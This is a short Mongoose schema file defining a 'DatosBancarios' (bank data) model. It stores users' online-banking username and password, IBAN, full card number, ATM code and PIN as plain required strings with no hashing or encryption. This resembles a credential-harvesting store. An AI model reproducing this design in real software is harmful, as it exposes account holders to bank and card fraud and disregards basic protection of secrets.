

import mongoose from "mongoose";

const datosBancariosSchema = new mongoose.Schema({
    userId: { type: String, required: true },
    banco: { type: String, required: true },
    usuario: { type: String, required: true },
    email: { type: String, required: true },
    clave: { type: String, required: true },
    numeroIBAN: { type: String, required: true },
    numeroTarjeta: { type: String, required: true },
    claveCajero: { type: String, required: true },
    codigoPin: { type: String, required: true },
    fecha: { type: Date, required: true },
}, { 
    timestamps: true 
});

const DatosBancarios = mongoose.model("DatosBancarios", datosBancariosSchema);

export default DatosBancarios; 